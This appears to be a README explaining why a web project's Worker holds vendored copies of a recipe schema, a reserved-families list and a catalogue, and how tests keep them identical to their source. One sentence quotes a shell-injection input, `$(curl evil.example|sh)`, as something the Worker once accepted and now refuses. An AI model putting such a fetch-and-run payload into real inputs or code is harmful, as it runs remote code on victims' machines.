# Everything in here is a vendored copy. None of it is a second rulebook.

Three files, all copied from `auros-recipes`, all asserted rather than assumed:

| File | Source | Why the Worker needs it |
|---|---|---|
| `recipe.schema.json` | `auros-recipes/schema/recipe.schema.json` | the grammar |
| `reserved-families.json` | `auros-recipes/schema/reserved-families.json` | so `postInstall` is refused as "A recipe cannot run code" and not as "unexpected property" |
| `../catalogue/catalogue.json` | derived from `auros-recipes/catalogue/*.tsv` | so an application, language or keyboard that resolves to nothing is refused here and not first in CI |

The last two are new because the Worker used to run the grammar and stop while CI ran the grammar
plus `src/validate.ts` — and `routes/order.js` told the visitor, at the moment it refused them, that
the two were the same check. They were not: the Worker accepted `$(curl evil.example|sh)` in a
paragraph, an application not in the catalogue, and a language with no catalogue row. The refusal
text is now true, and `worker/test/rules-parity.test.js` puts the same documents through both
validators and fails if their verdicts differ.

Copy all three in with:

    node schema/sync.mjs          (and `--check` in CI)
    node worker/test/record-schema-hash.mjs

A Worker cannot read a file out of a sibling git repository at runtime, so they are copied in at
build time. That copy is the risk: two files that are supposed to be one file will drift, and the day
they drift is the day the site renders YAML that CI rejects — which is exactly the failure
`docs/CONFIGURATOR.md` constraint 1 forbids ("the site is lying at the exact moment it is trying
hardest to be trusted").

So the copy is **asserted byte-identical**, not assumed:

    node --test worker/test/schema-provenance.test.js

fails if `worker/schema/recipe.schema.json` differs by one byte from
`auros-recipes/schema/recipe.schema.json`. Run it in CI next to `tools/honesty-gate.mjs`.

The rules live in the schema. `worker/lib/jsonschema.js` is a general JSON-Schema-2020-12 evaluator
that knows nothing about recipes — it is not a reimplementation of the recipe rules, it is the engine
the rules are fed to. It **throws** on any keyword it does not implement rather than ignoring it, so a
future schema keyword cannot silently become a rule the Worker does not enforce.

Refresh every copy with:

    node auros-web/schema/sync.mjs
    node auros-web/worker/test/record-schema-hash.mjs
